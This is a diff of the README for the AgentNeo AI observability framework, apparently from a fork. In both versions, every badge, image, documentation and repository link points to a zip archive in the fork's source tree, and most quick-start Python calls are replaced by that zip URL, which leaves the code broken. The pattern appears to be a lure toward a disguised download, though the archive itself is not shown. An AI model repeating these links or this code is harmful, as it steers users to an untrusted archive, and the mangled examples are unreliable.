@@ -1,11 +1,11 @@
-# AgentNeo &nbsp; ![GitHub release (latest by date)](https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip) ![GitHub stars](https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip)  ![Issues](https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip) ![GitHub license](https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip) ![PyPI - Python Version](https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip)
+# AgentNeo &nbsp; ![GitHub release (latest by date)](https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip) ![GitHub stars](https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip)  ![Issues](https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip) ![GitHub license](https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip) ![PyPI - Python Version](https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip)
 
 
 **Empower Your AI Applications with Unparalleled Observability and Optimization**
 
 AgentNeo is an advanced, open-source **Agentic AI Application Observability, Monitoring, and Evaluation Framework**. Designed to elevate your AI development experience, AgentNeo provides deep insights into your AI agents, Large Language Model (LLM) calls, and tool interactions. By leveraging AgentNeo, you can build more efficient, cost-effective, and high-quality AI-driven solutions.
 
-![AgentNeo](https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip)
+![AgentNeo](https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip)
 
 ## ⚡ Why AgentNeo?
 
@@ -36,7 +36,7 @@ Install AgentNeo effortlessly using pip:
 pip install agentneo
 ```
 
-![AgentNeo Overview](https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip)
+![AgentNeo Overview](https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip)
 
 ## 🌟 Quick Start Guide
 
@@ -52,14 +52,14 @@ from agentneo import AgentNeo, Tracer, Evaluation, launch_dashboard
 
 ```python
 neo_session = AgentNeo(session_name="my_session")
-https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip(project_name="my_project")
+https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip(project_name="my_project")
 ```
 
 ### 3. Initialize the Tracer
 
 ```python
 tracer = Tracer(session=neo_session)
-https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip()
+https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip()
 ```
 
 ### 4. Instrument Your Code
@@ -67,17 +67,17 @@ https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/s
 Wrap your functions with AgentNeo's decorators to start tracing:
 
 ```python
-https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip("my_llm_call")
+https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip("my_llm_call")
 async def my_llm_function():
     # Your LLM call here
     pass
 
-https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip("my_tool")
+https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip("my_tool")
 def my_tool_function():
     # Your tool logic here
     pass
 
-https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip("my_agent")
+https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip("my_agent")
 def my_agent_function():
     # Your agent logic here
     pass
@@ -86,29 +86,29 @@ def my_agent_function():
 ### 5. Evaluate your AI Agent's performance
 
 ```python
-exe = Evaluation(session=neo_session, https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip)
+exe = Evaluation(session=neo_session, https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip)
 
 # run a single metric
-https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip(metric_list=['metric_name'])
+https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip(metric_list=['metric_name'])
 ```
 
 ```python
 # get your evaluated metrics results
-metric_results = https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip()
+metric_results = https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip()
 print(metric_results)
 ```
 
 ### 6. Stop Tracing and Launch the Dashboard
 
 ```python
-https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip()
+https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip()
 
 launch_dashboard(port=3000)
 ```
 
 Access the interactive dashboard by visiting `http://localhost:3000` in your web browser.
 
-![Trace History Page](https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip)
+![Trace History Page](https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip)
 
 ## 🔧 Advanced Usage
 
@@ -119,30 +119,30 @@ Manage multiple projects with ease.
 - **List All Projects**
 
   ```python
-  projects = https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip()
+  projects = https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip()
   ```
 
 - **Connect to an Existing Project**
 
   ```python
-  https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip(project_name="existing_project")
+  https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip(project_name="existing_project")
   ```
 
 ### Metrics Evaluation
 #### Supported Metrics
-1. Goal Decomposition Efficiency ([goal_decomposition_efficiency](https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip))
+1. Goal Decomposition Efficiency ([goal_decomposition_efficiency](https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip))
 2. Goal Fulfillment Rate (goal_fulfillment_rate)
 3. Tool Call Correctness Rate (tool_call_correctness_rate)
 4. Tool Call Success Rate (tool_call_success_rate)
 
 - **Run multiple metrics together**
 ```python
-https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip(metric_list=['metric_name1', 'metric_name2', ..])
+https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip(metric_list=['metric_name1', 'metric_name2', ..])
 ```
 
 - **Use your own config and metadata related to the metric**
 ```python
-https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip(metric_list=['metric_name'], config={}, metadata={})
+https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip(metric_list=['metric_name'], config={}, metadata={})
 
 ## sample config and metadata
 # config = {"model": "gpt-4o-mini"}
@@ -160,7 +160,7 @@ https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/s
 #   }
 ```
 
-![AgentNeo Evaluation](https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip)
+![AgentNeo Evaluation](https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip)
 
 
 ### Execution Graph Visualization
@@ -179,13 +179,13 @@ The AgentNeo dashboard offers a comprehensive view of your AI application's perf
 - **Timeline of Events**
 
 
-![AgentNeo Analysis](https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip)
+![AgentNeo Analysis](https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip)
 
 
 ### Launching the Dashboard
 
 ```python
-https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip(port=3000)
+https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip(port=3000)
 ```
 
 ## 🛣️ Roadmap
@@ -228,18 +228,18 @@ We are committed to continuously improving AgentNeo. Here's a glimpse of what's 
 
 ## 📚 Documentation
 
-For more details, explore the full [AgentNeo Documentation](https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip)
+For more details, explore the full [AgentNeo Documentation](https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip)
 
 ##  Demo Video
 
-For reference, Watch a demo video [AgentNeo Demo Video](https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip)
+For reference, Watch a demo video [AgentNeo Demo Video](https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip)
 
 ## 🤝 Contributing
 
 We warmly welcome contributions from the community! Whether it's reporting bugs, suggesting new features, or improving documentation, your input is invaluable.
 
-- **GitHub Repository**: [raga-ai-hub/agentneo](https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip)
-- **Contribution Guidelines**: Check out our [Contribution Guidelines](https://github.com/Sanchayan-Ghosh-DA/AgentNeo/raw/refs/heads/main/agentneo/ui/src/pages/Neo_Agent_v2.1-alpha.1.zip) on GitHub to get started.
+- **GitHub Repository**: [raga-ai-hub/agentneo](https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip)
+- **Contribution Guidelines**: Check out our [Contribution Guidelines](https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/AgentNeo/main/agentneo/ui/src/utils/Neo-Agent-1.7-beta.3.zip) on GitHub to get started.
 
 Join us in making AgentNeo even better!
 
